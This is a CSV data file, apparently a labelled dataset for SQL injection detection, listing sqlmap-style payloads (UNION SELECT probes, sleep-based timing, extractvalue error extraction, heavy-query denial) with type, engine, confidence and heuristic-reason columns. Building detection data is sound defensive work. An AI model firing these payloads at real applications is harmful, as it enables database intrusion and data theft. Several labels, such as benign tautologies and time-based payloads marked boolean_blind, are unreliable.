id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20144,"-9392 ) ) or elt ( 1032 = 1032,3623 ) and ( ( 2975 = 2975",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20145,"-8200%"" ) ) union all select 7538,7538,7538#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20146,1 and ( 3437 = 2271 ) *2271,benign,generic,0.75,Heuristic analysis: benign inferred from structure,1
20147,"-5802' ) ) ) union all select 6286,6286,6286,6286#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20148,"1'+ ( select 'plcm' where 2141 = 2141 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.9,'ELT()' conditional function; MySQL boolean-blind context,2
20149,"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) -- uslt",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20150,"1' in boolean mode ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) #",boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20151,select ( case when ( 3672 = 8360 ) then 3672 else 3672* ( select 3672 from information_schema.character_sets ) end ) #,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20152,"1 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) # jmki",heavy_query,postgresql,0.9,Heuristic analysis: heavy_query inferred from structure,2
20153,1 where 1092 = 1092,boolean_blind,generic,0.75,Heuristic analysis: boolean_blind inferred from structure,1
20154,1' ) where 9538 = 9538,boolean_blind,generic,0.75,Heuristic analysis: boolean_blind inferred from structure,1
20155,"1' ) where 9006 = 9006 union all select null,null,null,null,null,null--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20156,"-6854"" where 7794 = 7794 union all select 7794,7794--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20157,1'|| ( select 'mosp' where 6085 = 6085,boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20158,"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'wdeu' like 'wdeu",boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20159,-6215' ) or ( 8459 = 8459 ) *4906,benign,generic,0.75,Heuristic analysis: benign inferred from structure,1
20160,"-8136' ) union all select 1324,1324,1324,1324#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20161,1 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) -- jdia,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20162,-5336' ) where 8691 = 8691 or 3608 = 1887--,boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20163,"1%"" ) ) union all select null,null,null,null,null#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20164,1' ) ) ) and ( 5995 = 9618 ) *9618 and ( ( ( 'nagr' like 'nagr,benign,generic,0.75,Heuristic analysis: benign inferred from structure,1
20165,1'|| ( select 'homm' where 4937 = 4937 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.9,'RLIKE' regex operator; MySQL boolean context.....,2
20166,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( 9646 = 9646",heavy_query,postgresql,0.75,Heuristic analysis: heavy_query inferred from structure,1
